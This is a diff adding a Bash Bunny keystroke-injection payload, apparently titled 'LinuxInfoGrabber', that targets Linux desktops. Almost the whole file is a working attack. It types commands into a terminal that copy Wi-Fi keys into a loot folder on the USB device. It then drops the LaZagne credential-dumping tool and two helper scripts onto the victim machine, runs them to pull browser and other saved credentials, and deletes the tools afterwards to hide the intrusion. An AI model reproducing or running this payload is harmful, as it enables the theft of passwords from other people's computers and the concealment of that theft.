@@ -1,0 +1,66 @@
+#!/bin/bash
+#
+# Attackmodes:   HID, Storage
+#
+# grabs Wi-Fi keys in Linux 
+# get the browser creds filename from recon and change execute2.sh
+
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+LED ATTACK
+RUN UNITY gnome-terminal 
+Q DELAY 1500 
+Q STRING export lootdir=/run/media/\$USER/BashBunny/loot/LinuxInfoGrabber #export loot directory 
+Q ENTER
+Q STRING mkdir -p \$lootdir #make loot directory 
+Q ENTER
+Q STRING cd /etc/sysconfig/network-scripts/ #go to where linux stores wi-fi passes 
+Q ENTER
+Q STRING find . -name \"keys*\" -exec cp '{}' \$lootdir \\\; #copy wi-fi passes to loot directory 
+Q ENTER 
+Q DELAY 1000
+Q ENTER 
+Q STRING export exepos=/run/media/\$USER/BashBunny/payloads/$SWITCH_POSITION #export payload location 
+Q ENTER 
+Q STRING cd \$exepos #go to payload location 
+Q ENTER
+Q STRING cp LaZagne-64bits /\$USER/ #copy LaZagne to victim computer 
+Q ENTER
+Q DELAY 1000 
+Q STRING cp execute.sh /\$USER/ #copy execute script for LaZagne to victim computer 
+Q DELAY 1000 
+Q ENTER 
+Q STRING cp execute2.sh /\$USER/ #copy execute script for SQL extract to victim computer 
+Q DELAY 1000 
+Q ENTER 
+Q STRING cd /\$USER/  
+Q ENTER
+Q STRING bash execute.sh #run LaZagne 
+Q ENTER
+Q STRING bash execute2.sh #run SQL extract   
+Q ENTER
+ DELAY 1000 
+Q STRING rm LaZagne-64bits #remove LaZagne from victim computer 
+Q DELAY 1000 
+Q ENTER
+Q STRING y 
+Q ENTER
+Q STRING rm execute.sh #remove first shell script from victim computer 
+Q DELAY 1000 
+Q ENTER
+Q STRING y
+Q ENTER
+Q STRING rm execute2.sh #remove second shell script from victim computer 
+Q DELAY 1000 
+Q ENTER
+Q STRING y
+Q ENTER
+Q STRING exit
+Q ENTER 
+
+# sync the filesystem
+sync
+
+LED FINISH 
